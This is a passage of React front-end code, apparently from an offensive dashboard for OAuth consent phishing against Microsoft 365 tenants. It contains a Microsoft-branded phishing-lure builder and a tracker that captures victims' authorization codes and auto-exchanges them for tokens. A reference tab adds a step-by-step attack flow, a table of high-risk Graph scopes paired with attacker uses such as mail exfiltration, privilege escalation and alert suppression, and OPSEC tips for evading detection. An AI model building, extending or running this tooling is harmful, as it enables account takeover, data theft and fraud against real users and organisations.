                          _hover={{ color: 'white' }} border="1px solid rgba(255,255,255,0.1)" borderRadius="7px">Test URL</Button>
                      </Flex>
                    </Flex>
                    <Text fontSize="11px" fontFamily="mono" color="var(--dash-text-secondary)" wordBreak="break-all" lineHeight="1.7">
                      {generatedUrl}
                    </Text>
                  </Box>
                )}
              </Box>
            </Box>
          </MotionBox>
        )}

        {/* ── Phishing Lures ────────────────────────────────────────────── */}
        {tab === 'lures' && (
          <MotionBox key="lures" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden">
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${ORANGE}80, transparent)` }} />
              <Box p={4}>
                <Flex align="center" justify="space-between" mb={4}>
                  <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)">Lure Template</Text>
                  <Flex gap={2}>
                    {lures.map((l, i) => (
                      <TabBtn key={l.id} label={l.label} active={lureIdx === i} color={ORANGE} onClick={() => setLureIdx(i)} />
                    ))}
                  </Flex>
                </Flex>

                {!generatedUrl && (
                  <Box p={3} bg={`${ORANGE}08`} border={`1px solid ${ORANGE}25`} borderRadius="10px" mb={4}>
                    <Text fontSize="12px" color={ORANGE}>
                      ⚠ Generate a Consent URL in the App Builder first — it will be embedded as the CTA link.
                    </Text>
                  </Box>
                )}

                <Flex align="center" justify="space-between" mb={3} p={3}
                  bg="rgba(255,255,255,0.03)" borderRadius="10px" border="1px solid rgba(255,255,255,0.07)">
                  <Box>
                    <Text fontSize="10px" color="var(--dash-text-muted)" mb={0.5}>Subject line</Text>
                    <Text fontSize="13px" fontWeight="medium" color="var(--dash-text-primary)">{lure.subject}</Text>
                  </Box>
                  <Flex gap={2}>
                    <Button size="xs" leftIcon={<CopyIcon />} onClick={() => copy(lure.html, 'HTML copied!')}
                      bg="rgba(255,255,255,0.06)" color="var(--dash-text-muted)"
                      _hover={{ color: 'white' }} border="1px solid rgba(255,255,255,0.1)" borderRadius="7px"
                    >Copy HTML</Button>
                    <Button size="xs" leftIcon={<CopyIcon />}
                      onClick={() => copy(lure.html.replace(/<[^>]+>/g, '').replace(/\s{2,}/g, ' ').trim(), 'Text copied!')}
                      bg="rgba(255,255,255,0.06)" color="var(--dash-text-muted)"
                      _hover={{ color: 'white' }} border="1px solid rgba(255,255,255,0.1)" borderRadius="7px"
                    >Copy Text</Button>
                  </Flex>
                </Flex>

                <Box borderRadius="10px" overflow="hidden" border="1px solid rgba(255,255,255,0.1)">
                  <Box bg="#d8d8d8" px={3} py={1.5}>
                    <Text fontSize="10px" color="#555" fontWeight="semibold">Email Preview</Text>
                  </Box>
                  <iframe srcDoc={lure.html} title="Email Preview"
                    style={{ width: '100%', height: '440px', border: 'none', display: 'block' }} />
                </Box>
              </Box>
            </Box>
          </MotionBox>
        )}

        {/* ── Capture Tracker ───────────────────────────────────────────── */}
        {tab === 'captures' && (
          <MotionBox key="captures" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <SimpleGrid columns={4} gap={3} mb={4}>
              {[['Total', totalCap, BLUE], ['Captured', numCaptured, GREEN], ['Exchanged', numExchanged, CYAN], ['Failed', numFailed, RED]].map(([label, count, color]) => (
                <Box key={label} bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
                  borderRadius="12px" p={3} textAlign="center">
                  <Text fontSize="24px" fontWeight="black" color={color}>{count}</Text>
                  <Text fontSize="11px" color="var(--dash-text-muted)" mt={0.5}>{label}</Text>
                </Box>
              ))}
            </SimpleGrid>

            {/* Exchange config */}
            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden" mb={4}>
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${PURPLE}80, transparent)` }} />
              <Box p={4}>
                <Flex align="center" justify="space-between" mb={4}>
                  <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)">Exchange Configuration</Text>
                  <Flex align="center" gap={3}>
                    <Flex align="center" gap={2}>
                      <Box w="7px" h="7px" borderRadius="full" bg={polling ? GREEN : 'rgba(255,255,255,0.18)'}
                        boxShadow={polling ? `0 0 6px ${GREEN}` : 'none'} />
                      <Text fontSize="11px" color={polling ? GREEN : 'var(--dash-text-muted)'}>
                        {polling ? 'Polling · 5s' : 'Idle'}
                      </Text>
                    </Flex>
                    <Button size="xs" h="26px" px={3} borderRadius="7px"
                      bg={polling ? `${RED}12` : `${GREEN}12`} color={polling ? RED : GREEN}
                      border={`1px solid ${polling ? `${RED}30` : `${GREEN}30`}`}
                      _hover={{ opacity: 0.8 }} onClick={() => setPolling(p => !p)}
                    >{polling ? 'Stop' : 'Start'} Polling</Button>
                    <Button size="xs" h="26px" px={3} borderRadius="7px" leftIcon={<RepeatIcon boxSize={3} />}
                      bg="rgba(255,255,255,0.05)" color="var(--dash-text-muted)"
                      _hover={{ color: 'white' }} border="1px solid rgba(255,255,255,0.09)"
                      onClick={fetchCaptures}>Refresh</Button>
                    {totalCap > 0 && (
                      <Button size="xs" h="26px" px={3} borderRadius="7px" leftIcon={<DeleteIcon boxSize={2.5} />}
                        bg={`${RED}10`} color={RED} _hover={{ bg: `${RED}18` }}
                        border={`1px solid ${RED}25`} onClick={handleClearAll}>Clear All</Button>
                    )}
                  </Flex>
                </Flex>

                <Text fontSize="11px" color="var(--dash-text-muted)" mb={3}>
                  Leave fields empty to inherit values from the App Builder tab.
                </Text>
                <SimpleGrid columns={4} spacing={3} mb={3}>
                  <Box>
                    <Label>Client ID override</Label>
                    <Input {...inputSx} value={excClientId} onChange={e => setExcCid(e.target.value)}
                      placeholder={clientId || 'from App Builder'} fontFamily="mono" fontSize="xs" />
                  </Box>
                  <Box>
                    <Label>Secret override</Label>
                    <Input {...inputSx} type="password" value={excSecret} onChange={e => setExcSec(e.target.value)}
                      placeholder="from App Builder" fontFamily="mono" />
                  </Box>
                  <Box>
                    <Label>Redirect URI override</Label>
                    <Input {...inputSx} value={excRedirect} onChange={e => setExcRedir(e.target.value)}
                      placeholder={redirectUri} fontFamily="mono" fontSize="xs" />
                  </Box>
                  <Box>
                    <Label>Exchange Tenant</Label>
                    <Flex gap={2}>
                      {[['orgs', 'organizations'], ['common', 'common']].map(([lbl, val]) => (
                        <Button key={val} size="xs" h="40px" flex="1" borderRadius="8px" onClick={() => setExcTenant(val)}
                          bg={excTenant === val ? `${GREEN}15` : 'rgba(255,255,255,0.04)'}
                          color={excTenant === val ? GREEN : 'var(--dash-text-muted)'}
                          border={`1px solid ${excTenant === val ? `${GREEN}35` : 'rgba(255,255,255,0.08)'}`}
                          _hover={{ opacity: 0.85 }}>{lbl}</Button>
                      ))}
                    </Flex>
                  </Box>
                </SimpleGrid>

                <Flex align="center" gap={3} mt={2}>
                  <Box as="button" w="36px" h="20px" borderRadius="full" cursor="pointer" border="none"
                    bg={autoExchange ? GREEN : 'rgba(255,255,255,0.12)'} position="relative" transition="background 0.2s"
                    onClick={() => setAuto(p => !p)}>
                    <Box w="14px" h="14px" borderRadius="full" bg="white"
                      position="absolute" top="3px" transition="left 0.2s"
                      left={autoExchange ? '19px' : '3px'} />
                  </Box>
                  <Text fontSize="12px" color="var(--dash-text-muted)">
                    Auto-exchange captured codes while polling is active
                  </Text>
                </Flex>
              </Box>
            </Box>

            {/* Captures table */}
            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden">
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${GREEN}80, transparent)` }} />
              <Box p={4}>
                <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)" mb={3}>
                  Captured Authorizations
                </Text>
                {captures.length === 0 ? (
                  <Flex direction="column" align="center" justify="center" py={10} gap={3}>
                    <Flex w="48px" h="48px" borderRadius="14px" bg={`${GREEN}12`} border={`1px solid ${GREEN}25`}
                      align="center" justify="center">
                      <Box as="svg" viewBox="0 0 24 24" fill="none" stroke={GREEN} strokeWidth="1.5"
                        strokeLinecap="round" strokeLinejoin="round" w="24px" h="24px">
                        <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
                      </Box>
                    </Flex>
                    <Text fontSize="13px" color="var(--dash-text-muted)">
                      No captures yet — start polling and send your consent URL
                    </Text>
                  </Flex>
                ) : (
                  <Box overflowX="auto">
                    <Box as="table" w="100%" style={{ borderCollapse: 'collapse' }}>
                      <Box as="thead">
                        <Box as="tr">
                          {['Time', 'Status', 'UPN', 'Code', 'Actions'].map(h => (
                            <Box as="th" key={h} px={3} py={2} textAlign="left">
                              <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)"
                                textTransform="uppercase" letterSpacing="widest">{h}</Text>
                            </Box>
                          ))}
                        </Box>
                      </Box>
                      <Box as="tbody">
                        {captures.map(c => {
                          const sc = { captured: GREEN, exchanged: BLUE, exchanging: ORANGE, failed: RED, error: RED }[c.status] || '#a0aec0';
                          return (
                            <Box as="tr" key={c.id} _hover={{ bg: 'rgba(255,255,255,0.02)' }}
                              borderTop="1px solid rgba(255,255,255,0.04)">
                              <Box as="td" px={3} py={2}>
                                <Text fontSize="12px">{new Date(c.receivedAt).toLocaleTimeString()}</Text>
                                <Text fontSize="10px" color="var(--dash-text-muted)">{new Date(c.receivedAt).toLocaleDateString()}</Text>
                              </Box>
                              <Box as="td" px={3} py={2}>
                                <Box display="inline-flex" px={2} py="2px" borderRadius="5px"
                                  bg={`${sc}15`} border={`1px solid ${sc}35`}>
                                  <Text fontSize="10px" color={sc} fontWeight="bold" textTransform="uppercase">{c.status}</Text>
                                </Box>
                                {c.error && <Text fontSize="10px" color={RED} mt={1} noOfLines={1}>{c.error}</Text>}
                              </Box>
                              <Box as="td" px={3} py={2}>
                                <Text fontSize="12px" color={c.upn ? 'var(--dash-text-primary)' : 'var(--dash-text-muted)'}>{c.upn || '—'}</Text>
                              </Box>
                              <Box as="td" px={3} py={2}>
                                {c.code ? (
                                  <Flex align="center" gap={1}>
                                    <Text fontSize="11px" fontFamily="mono" color="var(--dash-text-secondary)">{c.code.slice(0,14)}…</Text>
                                    <IconButton size="xs" icon={<CopyIcon />} variant="ghost"
                                      color="var(--dash-text-muted)" _hover={{ color: 'white' }}
                                      onClick={() => copy(c.code, 'Code copied!')} h="18px" minW="18px" aria-label="copy" />
                                  </Flex>
                                ) : <Text fontSize="11px" color="var(--dash-text-muted)">—</Text>}
                              </Box>
                              <Box as="td" px={3} py={2}>
                                <Flex gap={2}>
                                  {c.status === 'captured' && (
                                    <Button size="xs" h="24px" px={3} borderRadius="6px"
                                      isLoading={exchangingId === c.id} onClick={() => handleExchange(c)}
                                      bg={`${BLUE}12`} color={BLUE} border={`1px solid ${BLUE}30`}
                                      _hover={{ bg: `${BLUE}22` }}>Exchange</Button>
                                  )}
                                  {c.status === 'exchanged' && c.tokenResponse && (
                                    <Button size="xs" h="24px" px={3} borderRadius="6px"
                                      onClick={() => copy(JSON.stringify(c.tokenResponse, null, 2), 'Token copied!')}
                                      bg={`${GREEN}12`} color={GREEN} border={`1px solid ${GREEN}30`}
                                      _hover={{ bg: `${GREEN}22` }}>Copy Token</Button>
                                  )}
                                  <IconButton size="xs" icon={<DeleteIcon boxSize={2.5} />} variant="ghost"
                                    color="var(--dash-text-muted)" _hover={{ color: RED, bg: `${RED}10` }}
                                    onClick={() => handleDelete(c.id)} h="24px" minW="24px" aria-label="delete" />
                                </Flex>
                              </Box>
                            </Box>
                          );
                        })}
                      </Box>
                    </Box>
                  </Box>
                )}
              </Box>
            </Box>
          </MotionBox>
        )}

        {/* ── Reference ─────────────────────────────────────────────────── */}
        {tab === 'reference' && (
          <MotionBox key="reference" initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden" mb={4}>
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${BLUE}80, transparent)` }} />
              <Box p={4}>
                <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)" mb={4}>Attack Flow</Text>
                {[
                  ['1', 'Register App in Azure Portal',   'Create a new app registration at portal.azure.com. Note the Client ID and create a Client Secret under Certificates & Secrets.',                                                               BLUE],
                  ['2', 'Configure Redirect URI',          'Add your callback URL to the app\'s Redirect URIs. For ops: real domain + HTTPS. Locally: ngrok or Cloudflare Tunnel → localhost:5000/api/evil-oauth/callback.',                              GREEN],
                  ['3', 'Craft Consent URL',               'Use the App Builder to select high-value delegated scopes and generate the OAuth consent URL. Delegated scopes require only user consent — no admin approval.',                               ORANGE],
                  ['4', 'Deliver Phishing Lure',           'Send the consent URL via email, Teams message, or in a document. Use the Phishing Lures tab for convincing Microsoft-branded templates.',                                                      RED],
                  ['5', 'Victim Consents',                 'Target sees a legitimate Azure consent prompt with your app\'s display name and requested permissions. On Accept, the code is sent to your redirect URI.',                                     PURPLE],
                  ['6', 'Auto-Exchange Code',              'Server receives the code at /api/evil-oauth/callback. Enable polling + auto-exchange in Capture Tracker — codes expire in ~60 seconds so timing matters.',                                    GREEN],
                  ['7', 'Persist & Enumerate',             'Captured tokens are pushed to the Device Code Phishing Token Vault. Use the Graph Enumerate feature to read mail, exfiltrate files, enumerate users, and escalate privileges.',               ORANGE],
                ].map(([num, title, desc, color]) => (
                  <Flex key={num} gap={0}>
                    <Flex direction="column" align="center" mr={4}>
                      <Flex w="26px" h="26px" borderRadius="full" bg={`${color}15`} border={`1.5px solid ${color}35`}
                        align="center" justify="center" flexShrink={0}>
                        <Text fontSize="11px" fontWeight="bold" color={color}>{num}</Text>
                      </Flex>
                      <Box w="1px" flex="1" bg="rgba(255,255,255,0.06)" my={1} minH="12px" />
                    </Flex>
                    <Box pb={4} pt="2px">
                      <Text fontSize="13px" fontWeight="semibold" color={color} mb={1}>{title}</Text>
                      <Text fontSize="12px" color="var(--dash-text-muted)" lineHeight="1.7">{desc}</Text>
                    </Box>
                  </Flex>
                ))}
              </Box>
            </Box>

            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden" mb={4}>
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${RED}80, transparent)` }} />
              <Box p={4}>
                <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)" mb={3}>High-Value Scope Reference</Text>
                <Box overflowX="auto">
                  <Box as="table" w="100%" style={{ borderCollapse: 'collapse' }}>
                    <Box as="thead">
                      <Box as="tr" borderBottom="1px solid rgba(255,255,255,0.08)">
                        {['Scope', 'Description', 'Risk', 'Attacker Use Case'].map(h => (
                          <Box as="th" key={h} px={3} py={2} textAlign="left">
                            <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)" textTransform="uppercase" letterSpacing="widest">{h}</Text>
                          </Box>
                        ))}
                      </Box>
                    </Box>
                    <Box as="tbody">
                      {[
                        ['Mail.ReadWrite',                    'Read & write all mail',                 'critical', 'Exfiltrate email, inbox rules, plant lures'],
                        ['Mail.Send',                         'Send as any user',                      'critical', 'BEC fraud, internal spear-phishing'],
                        ['Files.ReadWrite.All',               'Access all OneDrive/SharePoint',        'critical', 'Exfiltrate documents, plant malicious files'],
                        ['Directory.ReadWrite.All',           'Full directory access',                 'critical', 'Add accounts, modify attributes, export users'],
                        ['RoleManagement.ReadWrite.Directory','Manage Azure AD roles',                 'critical', 'Privilege escalation to Global Admin'],
                        ['Application.ReadWrite.All',         'Manage app registrations & SPs',       'critical', 'Add credentials to service principals'],
                        ['User.ReadWrite.All',                'Manage all user accounts',              'critical', 'Password resets, add MFA, disable accounts'],
                        ['Group.ReadWrite.All',               'Manage all groups',                     'critical', 'Add to admin groups, modify access'],
                        ['Chat.ReadWrite',                    'Read & write Teams chats',              'high',     'Monitor conversations, Teams phishing'],
                        ['AuditLog.Read.All',                 'Read all audit logs',                   'high',     'Identify admin patterns, cover tracks'],
                        ['SecurityEvents.ReadWrite.All',      'Manage security events',                'critical', 'Suppress alerts, hide activity'],
                      ].map(([scope, desc, risk, useCase]) => (
                        <Box as="tr" key={scope} _hover={{ bg: 'rgba(255,255,255,0.02)' }} borderTop="1px solid rgba(255,255,255,0.04)">
                          <Box as="td" px={3} py={2}><Text fontSize="12px" fontFamily="mono" color={GREEN}>{scope}</Text></Box>
                          <Box as="td" px={3} py={2}><Text fontSize="12px" color="var(--dash-text-secondary)">{desc}</Text></Box>
                          <Box as="td" px={3} py={2}>
                            <Box display="inline-block" px={1.5} py="1px" borderRadius="4px"
                              bg={RISK_BG[risk]} border={`1px solid ${RISK_COLOR[risk]}35`}>
                              <Text fontSize="9px" color={RISK_COLOR[risk]} fontWeight="bold" textTransform="uppercase">{risk}</Text>
                            </Box>
                          </Box>
                          <Box as="td" px={3} py={2}><Text fontSize="11px" color="var(--dash-text-muted)">{useCase}</Text></Box>
                        </Box>
                      ))}
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>

            <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
              borderRadius="14px" overflow="hidden">
              <Box h="2px" style={{ background: `linear-gradient(to right, transparent, ${ORANGE}80, transparent)` }} />
              <Box p={4}>
                <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)" mb={3}>OPSEC Notes</Text>
                <SimpleGrid columns={2} spacing={3}>
                  {[
                    ['Use legitimate app names',        'Apps named "SharePoint Document Sync" or "Teams Meeting Add-in" bypass initial suspicion and match common IT deployments.'],
                    ['Target specific tenants',          'Use the victim\'s tenant ID instead of "common" to prevent your attacker tenant domain from appearing on the consent screen.'],
                    ['Request only delegated scopes',    'Delegated scopes require only user consent. Application scopes require Global Admin approval — avoid them to reduce friction.'],
                    ['Exchange codes fast',              'Authorization codes expire in 60-90 seconds. Enable auto-exchange and ensure your server is reachable before sending lures.'],
                    ['Exploit refresh tokens',           'Microsoft refresh tokens last up to 90 days. Push exchanged tokens to the Device Code Phishing vault and use the refresh flow.'],
                    ['Callback URL opsec',               'Host your callback on a domain resembling Microsoft services to avoid browser warnings in the address bar after redirect.'],
                  ].map(([title, desc]) => (
                    <Box key={title} p={3} bg="rgba(255,255,255,0.03)" borderRadius="10px"
                      border="1px solid rgba(255,255,255,0.06)">
                      <Text fontSize="12px" fontWeight="semibold" mb={1}>{title}</Text>
                      <Text fontSize="12px" color="var(--dash-text-muted)" lineHeight="1.6">{desc}</Text>
                    </Box>
                  ))}
                </SimpleGrid>
              </Box>
            </Box>
          </MotionBox>
        )}

      </AnimatePresence>
    </Box>
  );
}
